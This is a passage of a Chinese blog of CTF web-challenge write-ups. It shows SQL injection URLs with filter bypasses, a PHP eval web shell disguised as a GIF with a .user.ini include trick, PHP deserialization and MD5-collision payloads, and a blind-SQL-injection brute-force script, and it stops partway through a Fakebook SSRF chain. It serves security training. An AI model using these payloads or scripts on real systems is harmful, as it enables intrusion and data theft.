<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ByabdA"><img src="https://s1.ax1x.com/2020/11/03/ByabdA.png" alt="ByabdA.png"></a></p>
<p>浏览器中Cookie填一下即可。登陆后得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b45f2c42<span class="number">-9</span>be8<span class="number">-46</span>a5<span class="number">-9</span>a24-d622bbccad79&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十一、-极客大挑战-2019-BabySQL"><a href="#十一、-极客大挑战-2019-BabySQL" class="headerlink" title="十一、[极客大挑战 2019]BabySQL"></a>十一、[极客大挑战 2019]BabySQL</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin%27%20oorr%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%23&amp;password=123 </span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~geek~&#x27;</span></span><br><span class="line"></span><br><span class="line">/check.php?username=admin%27%20oorr%20updatexml(1,concat(0x7e,(selselectect%20group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=database()),<span class="string">&#x27;^&#x27;</span>),1)%23&amp;password=123 </span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~b4bsql,geekuser^&#x27;</span></span><br><span class="line"></span><br><span class="line">/check.php?username=admin%27%20oorr%20updatexml(1,concat(0x7e,(selselectect%20susubstrbstr(group_concat(column_name),1,20)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name=<span class="string">&#x27;b4bsql&#x27;</span>),<span class="string">&#x27;^&#x27;</span>),1)%23&amp;password=123</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,username,password^&#x27;</span>    <span class="comment">#两个表都是三个字段</span></span><br><span class="line"></span><br><span class="line">/check.php?username=adminsh%27%20oorr%20updatexml(1,concat(0x7e,(selselectect%20susubstrbstr(group_concat(passwoorrd),155,30)%20frfromom%20b4bsql),<span class="string">&#x27;^&#x27;</span>),1)%23&amp;password=123</span><br><span class="line">flag&#123;8aeb63ef-2526-47f4-ad14-de209366f473&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了：or、select、where、from、substr，双写绕过，本质就是关键字替换空格</p>
<h3 id="十二、-极客大挑战-2019-Upload"><a href="#十二、-极客大挑战-2019-Upload" class="headerlink" title="十二、[极客大挑战 2019]Upload"></a>十二、[极客大挑战 2019]Upload</h3><p>​    1、此题黑名单过滤，可phtml</p>
<p>​    2、此题检测图片内容，GIF头</p>
<p>​    3、此题检测内容是否有PHP标签&lt;?，使用js代替PHP脚本，学习了。（<strong>注：PHP7以后不再支持该方法</strong>）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;zjc&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">55</span>ed55f0<span class="number">-539</span>a<span class="number">-44</span>a9<span class="number">-926</span>b-ddcf182ed69e&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十三、-SUCTF-2019-CheckIn"><a href="#十三、-SUCTF-2019-CheckIn" class="headerlink" title="十三、[SUCTF 2019]CheckIn"></a>十三、[SUCTF 2019]CheckIn</h3><p>​    此题上传漏洞新姿势，前题是需要上传目录中有php文件。配合上传**.user.ini<strong>来得到一个文件包含的效果。</strong>.user.ini**类似于.htaccess，是php的子目录中的配置文件。</p>
<blockquote>
<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 <em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p>
</blockquote>
<p>​    配合php.ini中的文件包含配置用，auto_prepend_file 、auto_append_file。本题中上传目录提供了一个index.php，因此我们写入一个图片马，然后写入一个.user.ini通过auto_prepend_file的选项使该目录下的所有php文件执行时包含这个图片马。</p>
<p>​    <strong>注：这里其实想过上传.htaccess文件，但是题目有文件内容是图片的exif_iamgetype函数要求，.htaccess中如果出现无效字符则直接整个配置无效。.user.ini就没有这个情况发生，即使第一句GIF89是无效语句，也不影响后面配置的运行。</strong></p>
<p>​    Payload：</p>
<p>.user.ini + JS图片马jsxmgif.gif</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89</span><br><span class="line">auto_prepend_file=jsxmgif.gif</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?,? d23&lt;pre&gt;&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>($_POST[<span class="string">&#x27;zjc&#x27;</span>]);&lt;/script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>上传后，访问上传目录中的index.php即可触发这个配置。get /flag即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">8</span>d043cf7<span class="number">-7775</span><span class="number">-457e-8620</span>-d4c34c65dee0&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十四、-极客大挑战-2019-BuyFlag"><a href="#十四、-极客大挑战-2019-BuyFlag" class="headerlink" title="十四、[极客大挑战 2019]BuyFlag"></a>十四、[极客大挑战 2019]BuyFlag</h3><p>​    1、看提示，要身份是学校人，首先想到身份伪造，看Session，改1。</p>
<p>​    2、得花钱，post传money和password，pay.php源码中提示的。传入money=10000000时，显示过长，那么其实科学计数法就可以，比如：1.1e8。（必须比1e8大才能买，这里我1e8没过，还以为是session爆破…）</p>
<p><strong>漏洞点</strong></p>
<p>​        1、PHP **is_numeric()**漏洞：可以使用%20、%00绕过数字检查。</p>
<p>​        2、PHP **strcmp()**漏洞：还有一种方法是money[]=10000000，是strcmp()函数的绕过方式，在PHP5.3前strcmp在比较非字符串类型的数据时，尽管错误，但仍然会返回0。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">http://e8fa9c1f-c2cb-4f05-8cba-bc7dffd7fd00.node3.buuoj.cn/pay.php</span><br><span class="line"></span><br><span class="line">password=404aa&amp;money=1.1e8</span><br><span class="line"></span><br><span class="line">flag&#123;4ede3f36-28b3-4ce1-9b8f-c1cd6cc0bb9a&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十五、-BJDCTF2020-Easy-MD5"><a href="#十五、-BJDCTF2020-Easy-MD5" class="headerlink" title="十五、[BJDCTF2020]Easy MD5"></a>十五、[BJDCTF2020]Easy MD5</h3><p><strong>MD5考点：</strong></p>
<p>​    0e碰撞（弱类型比较）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO  aabg7XSs SWAnXIiW8Ja4ZSScYOaW TvprPWh9i81i5cBtEkFG=</span><br></pre></td></tr></table></figure>

<p>​    数组返回值NULL恒等漏洞（强类型比较）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>

<p>​    真正的MD5碰撞，值不同，MD5相同</p>
<blockquote>
<p>含有更多二进制样本（国产）<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
<p>外国的讨论：<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"><span class="comment">#注：无需URL编码</span></span><br></pre></td></tr></table></figure>

<p>​    Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b2c88b9c-f754<span class="number">-41</span>cb<span class="number">-8698</span><span class="number">-497647e43</span>bec&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十六、-ZJCTF-2019-NiZhuanSiWei"><a href="#十六、-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="十六、[ZJCTF 2019]NiZhuanSiWei"></a>十六、[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1、上网学习了一下，<strong>data伪协议</strong>突破了第一步进展:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3fdf71bd-7ba8-45b7-9d2d-94a815756c7f.node3.buuoj.cn/?text=data:text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>

<p>2、第二步php://filter/convert.base64-encode/resource读一下useless.php源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>3、构造个反序列化，file属性赋值为flag.php使其触发__tostring方法输出flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​    Flag已经输出，看看html源码吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">608100</span>eb<span class="number">-7e97</span><span class="number">-40</span>c7-b85a<span class="number">-3006</span>b3658bbe&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十七、-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#十七、-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="十七、[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>十七、[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>踩了很多坑</p>
<p>1、异或时两边表达式不用括号，优先级不同，区别很大！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">users表中group_concat(username)的结果第一个是&#39;D&#39;</span><br><span class="line">1^(substr((select group_concat(username) from users),1,1)&#x3D;&#39;A&#39;);    </span><br><span class="line">#结果 正常1^0 &#x3D; 1</span><br><span class="line">1^substr((select group_concat(username) from users),1,1)&#x3D;&#39;A&#39;;</span><br><span class="line">#结果 1^1&#x3D;0，没有加括号！相当于1^&#39;D&#39;&#x3D;&#39;A&#39;!</span><br></pre></td></tr></table></figure>

<p>2、有WAF的时候要注意自己脚本中的Payload是否存在WAF拦截的字符！！</p>
<p>3、目标网站可能有WAF，要处理WAF拦截的情况。</p>
<p>4、脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ascii_low = <span class="number">32</span>  <span class="comment">#爆破的ascii字符下限</span></span><br><span class="line">ascii_up = <span class="number">127</span>  <span class="comment">#爆破的ascii字符上限</span></span><br><span class="line">keyword=<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">tb_choose=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">cn_name=[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">IFS=<span class="string">&#x27;\x0a&#x27;</span></span><br><span class="line">payload = [<span class="string">&quot;1^if(&quot;</span>, <span class="string">&quot;,0,1)&quot;</span>] <span class="comment">#拆分出attack payload插入点</span></span><br><span class="line">param = &#123;<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span>&#125;<span class="comment">#爆破点参数值不填，如果有其它参数，加入即可</span></span><br><span class="line">key = <span class="string">&quot;id&quot;</span>   <span class="comment">#爆破注入的参数</span></span><br><span class="line">url = <span class="string">&quot;http://d2e9e3db-f037-4f2d-849a-20328ecb52ad.node3.buuoj.cn/index.php&quot;</span>  <span class="comment">#注入URL</span></span><br><span class="line">flag = <span class="number">1</span>    <span class="comment"># 0 Get / 1 Post</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[*]爆破表<span class="subst">&#123;tb_choose&#125;</span>中的记录条数......&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respon_require</span>():</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        respon = requests.get(url, params=param)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">1</span>:</span><br><span class="line">        respon = requests.post(url, data=param)</span><br><span class="line">    <span class="keyword">return</span> respon</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;(select<span class="subst">&#123;IFS&#125;</span>count(<span class="subst">&#123;cn_name[<span class="number">0</span>]&#125;</span>)<span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>)=<span class="subst">&#123;i&#125;</span>&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">        dt_count = i </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+]数据表<span class="subst">&#123;tb_choose&#125;</span>中记录条数：<span class="subst">&#123;dt_count&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(cn_name)</span><br><span class="line">    cn_choose = input(<span class="string">&#x27;输入要爆破的字段数据:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cn_choose.lower() <span class="keyword">not</span> <span class="keyword">in</span> [tmp.lower() <span class="keyword">for</span> tmp <span class="keyword">in</span> cn_name]:</span><br><span class="line">        print(<span class="string">&#x27;[-]Error&#x27;</span>) </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, dt_count):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">            <span class="comment">#param[key] = payload[0] + f&quot;(select&#123;IFS&#125;length(&#123;cn_choose&#125;)&#123;IFS&#125;from&#123;IFS&#125;&#123;tb_choose&#125;&#123;IFS&#125;LIMIT&#123;IFS&#125;&#123;i&#125;,1)=&#123;j&#125;&quot; + payload[1]</span></span><br><span class="line">            param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;(select<span class="subst">&#123;IFS&#125;</span>length(<span class="subst">&#123;cn_choose&#125;</span>)<span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>)=<span class="subst">&#123;j&#125;</span>&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">                    dt_len = j</span><br><span class="line">                    tmp_data = <span class="string">&quot;&quot;</span></span><br><span class="line">                    real_res = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">while</span> real_res &lt; dt_len:</span><br><span class="line">                        left = ascii_low</span><br><span class="line">                        right = ascii_up</span><br><span class="line">                        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                mid = (left + right) // <span class="number">2</span></span><br><span class="line">                                param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;ascii(substr((select<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;cn_choose&#125;</span><span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>),<span class="subst">&#123;real_res+<span class="number">1</span>&#125;</span>,1))=ascii(char(<span class="subst">&#123;mid&#125;</span>))&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">                                <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">                                    tmp_data += chr(mid)</span><br><span class="line">                                    real_res += <span class="number">1</span> </span><br><span class="line">                                    <span class="keyword">break</span></span><br><span class="line">                                param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;ascii(substr((select<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;cn_choose&#125;</span><span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>),<span class="subst">&#123;real_res+<span class="number">1</span>&#125;</span>,1))&lt;ascii(char(<span class="subst">&#123;mid&#125;</span>))&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">                                <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">                                    right = mid - <span class="number">1</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    left = mid + <span class="number">1</span></span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                print(e)</span><br><span class="line">                                <span class="keyword">pass</span></span><br><span class="line">                    print(<span class="string">f&#x27;[<span class="subst">&#123;cn_choose&#125;</span>]：<span class="subst">&#123;tmp_data&#125;</span>, [length]: <span class="subst">&#123;dt_len&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>5、Flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">7</span>c4e5fbb<span class="number">-1e20</span><span class="number">-415</span>b<span class="number">-9</span>fad-af978c8224cb&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十八、-网鼎杯-2018-Fakebook"><a href="#十八、-网鼎杯-2018-Fakebook" class="headerlink" title="十八、[网鼎杯 2018]Fakebook"></a>十八、[网鼎杯 2018]Fakebook</h3><p>SSRF+SQL+PHP反序列化组合拳</p>
<p>1、信息收集，robots.txt中发现有源码user.php.bak。</p>
<p>​    简单审计源码初步认定是SSRF漏洞利用获得flag，盲猜网页目录下的flag.php，发现存在。根据下面的代码，正则严格要求http协议才能通过，无法构造file协议。尝试半天无果，查询WP发现查询blog的参数页存在SQL注入。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、?no=X参数的SQL注入，且WAF过滤select，行内注释过滤</p>
<p>​    经过参数传递测试，发现是数字型注入且可联合查询构造回显，测试中发现后台过滤了select，行内注释过滤即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=<span class="number">15</span>%<span class="number">20</span>union%<span class="number">20</span><span class="comment">/*!selecT*/</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>3、发现存在反序列化函数报错，因此猜测，字段1、2、3、4分别是username、age、blog地址、序列化数据，后端需要每次根据no参数查询出4字段的序列化数据进行反序列化，因此下面构造UserInfo序列化数据填充blog地址，即可绕过SSRF请求使用file协议进行任意文件读取。</p>
